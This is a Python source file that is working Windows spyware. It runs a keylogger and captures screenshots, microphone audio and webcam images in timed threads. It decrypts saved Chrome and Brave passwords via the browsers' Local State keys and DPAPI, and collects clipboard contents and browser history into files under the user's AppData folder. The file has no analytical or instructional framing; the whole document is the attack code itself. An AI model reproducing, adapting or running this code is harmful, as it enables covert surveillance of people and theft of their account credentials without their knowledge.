import subprocess
import win32clipboard
import os
import cv2
import sounddevice
import logging
import json
import shutil
import browserhistory as bh
from scipy.io.wavfile import write as write_rec
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from threading import Thread
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import time


ROOT_PATH = os.path.expanduser("~")
ROOT_PATH = ROOT_PATH.replace("\\", "/")
PATH = ROOT_PATH + "/AppData/Local"
print(PATH)


def keylogger():
    logging.basicConfig(filename=(f'{PATH}/results/key_log/' + 'key_logs.txt'),
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(Key): return logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()


def screenshot():
    for _ in range(0, 60):
        picture = ImageGrab.grab()
        picture.save(f'{PATH}/results/screenshots/' + 'screenshot_{}.png'.format(_))
        time.sleep(5)


def microphone():
    for _ in range(0, 5):
        fs = 44100
        seconds = 60

        recording = sounddevice.rec(
            int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        write_rec(f'{PATH}/results/microphone/' +
                  '{}_mic_recording.wav'.format(_), fs, recording)


def webcam():
    try:
        cam = cv2.VideoCapture(0)

        for _ in range(0, 60):
            ret, image = cam.read()
            file = (f'{PATH}/results/webcam/' + '{}.jpg'.format(_))
            cv2.imwrite(file, image)
            time.sleep(5)

        cam.release
        cv2.destroyAllWindows

    except:
        print("Web camera isn't availible")


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key(browser='chrome'):

    if browser == 'chrome':
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    elif browser == 'brave':
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        try:

            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:

            return ""


def get_passwords(key, browser):
    if browser == 'chrome':
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")

        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

        browser_passwords = []

        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                browser_passwords.append(f"Origin URL: {origin_url}")
                browser_passwords.append(f"Action URL: {action_url}")
                browser_passwords.append(f"Username: {username}")
                browser_passwords.append(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                browser_passwords.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            browser_passwords.append("="*50)

        with open(f'{PATH}/results/key_log/' + f'passwords_{browser}.txt', 'a') as browser_psw:
            browser_psw.write(json.dumps(
                browser_passwords, indent=4, sort_keys=True))

        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass

    elif browser == 'brave':
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")

        filename = "BraveData.db"
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

        browser_passwords = []

        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                browser_passwords.append(f"Origin URL: {origin_url}")
                browser_passwords.append(f"Action URL: {action_url}")
                browser_passwords.append(f"Username: {username}")
                browser_passwords.append(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                browser_passwords.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            browser_passwords.append("="*50)

        with open(f'{PATH}/results/key_log/' + f'passwords_{browser}.txt', 'a') as browser_psw:
            browser_psw.write(json.dumps(
                browser_passwords, indent=4, sort_keys=True))

        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass


def main():

    create_folder = f'{PATH}/results'

    if os.path.exists(create_folder):
        shutil.rmtree(create_folder)
        os.mkdir(create_folder)

    else:
        os.mkdir(create_folder)

    directories = [f'{PATH}/results/screenshots/', f'{PATH}/results/key_log/',
                   f'{PATH}/results/microphone/', f'{PATH}/results/webcam/']

    for i in directories:
        if os.path.exists(i):
            shutil.rmtree(create_folder)
            os.mkdir(i)

        else:
            os.mkdir(i)

    # Get Chrome/Brave passwords
    key = get_encryption_key(browser='brave')
    get_passwords(key=key, browser='brave')

    key = get_encryption_key(browser='chrome')
    get_passwords(key=key, browser='chrome')

    # Clipboard Data
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        with open(f'{PATH}/results/key_log/' + 'clipboard_info.txt', 'a') as clipboard_info:
            clipboard_info.write('Clipboard Data: ' + pasted_data + ' \n')
    except:
        pass

    # Browser History
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browsers = hist.keys()

    browser_history.extend((bh_user, db_path, hist))
    with open(f'{PATH}/results/key_log/' + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(
            browser_history, indent=4, sort_keys=True))

    t1 = Thread(target=keylogger)
    t2 = Thread(target=screenshot)
    t3 = Thread(target=microphone)
    t4 = Thread(target=webcam)

    t1.start()
    t2.start()
    t3.start()
    t4.start()

    t1.join(timeout=300)
    t2.join(timeout=300)
    t3.join(timeout=300)
    t4.join(timeout=300)


if __name__ == '__main__':
    main()
